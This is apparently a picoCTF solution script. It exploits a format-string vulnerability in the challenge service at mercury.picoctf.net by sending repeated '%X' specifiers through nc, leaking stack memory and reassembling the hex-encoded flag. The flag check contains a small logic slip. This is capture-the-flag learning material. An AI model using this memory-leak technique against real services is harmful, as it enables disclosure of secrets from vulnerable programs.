#wget https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c

python -c """
import subprocess
import base64

command = '(sleep 1; echo 1; sleep 1; echo {}) | nc mercury.picoctf.net 20195'

for n in range(1, 51):
    process = subprocess.Popen(command.format('%X' * n), stdout=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    data = output.decode('utf-8')

    potential_flag = data.split('\n')[9]
    #print(f'{n:2} {potential_flag} -> ', end='')
    try:
        flag = base64.b16decode(potential_flag)
        #print(flag)
        if b'ocip{' and b'}' in flag:
            flag = flag[flag.find(b'ocip') : flag.find(b'}') + 1]
            break
    except ValueError as e:
        #print(f'ValueError: {e}')
        pass

result = []
for i in range(4, len(flag)+1, 4):
    result.append(flag[i-4:i][::-1])
result = b''.join(result)
    
if result.find(b'}') == len(result) -1:
    print(result.decode())
else:
    print(result[:result.find(b'}')+1].decode())
"""
